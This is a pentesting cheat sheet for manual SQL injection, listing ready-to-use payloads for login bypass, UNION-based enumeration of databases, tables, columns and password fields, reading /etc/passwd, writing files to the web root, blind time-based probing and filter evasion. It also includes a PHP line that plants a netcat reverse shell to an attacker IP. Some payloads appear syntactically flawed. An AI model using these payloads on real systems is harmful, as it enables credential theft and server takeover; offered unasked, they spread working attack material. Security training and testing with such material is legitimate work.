---
title: SQLi Cheat sheet for manual injection
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting
---

# SQLi Cheat sheet for manual injection

See a more detailed [explanation about SQL injection](sql-injection.md).


### Manual UNION attack

```
# 0. Comments 
--comment       // Oracle
--comment       // Microsoft
/*comment*      // Microsoft
--comment       // PostgreSQL
/*comment*/     // PostgreSQL
#comment        // MySQL
-- comment      // MySQL [Note the space after the double dash]
/*comment*/     // MySQL

   
# 1. Bypass a form      
1' OR '1'='1';#
' OR '1'='1';#
1' OR '1'='1';-- - 
' OR '1'='1';-- -  


# 2. Number of columns (UNION attack)
1' OR '1'='1' order by 1;#
1' OR '1'='1' order by 2;#
1' OR '1'='1' order by 3;#
...
# Do this until you get an error message and then you will know the number of columns
# Another method to see the number of columns. 
' OR '1'='1' order by 1;-- -   

# 3. Get which column is being displayed. For instance, when we know we have 6 columns:
1' OR '1'='1' UNION SELECT all 1,2,3,4,5,6;# 

# 4. Get names of all databases 
1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#

# 5. Get names of all tables from the selected database
1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 


# 6. Get the name of all columns of a selected table from a selected database
1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users';#


# 7. Get the value of a selected column (for instance, password)
1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
```


Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:

```
database()
user()
version()
```

And here an example of how to retrieve them:

```
# if injectable columns are number 2, 3 and 4 you can display some info from the system
union select 1, database(),user(),version(),5

# Extra bonus
# You can also load a file from the system with
union select 1, load_file(/etc/passwd),3,4,5

# and you can try to write to a file in the server
union select 1,'example example',3,4,5 into outfile '/var/www/path/to/file.txt'
union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'

# and we can combine that with a reverse shell like
union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'

```


### Manual SQLi Blind attack

user() returns the name of the user currently using the database.
substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

```
' OR substring(user(), 1, 1) = 'a
' OR substring(user(), 1, 1) = 'b
1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
```


### Extra Bonus: Bypassing quotation marks

Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.

More bypassing tips:

```
# Using mingled upper and lowercase

# Using spaces url encoded
+

# Using comments
/**/
/**
--
; --
; /*
; //

# Example of bypassing webpages that only displays one value at a time
1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&Submit=Submit#

```
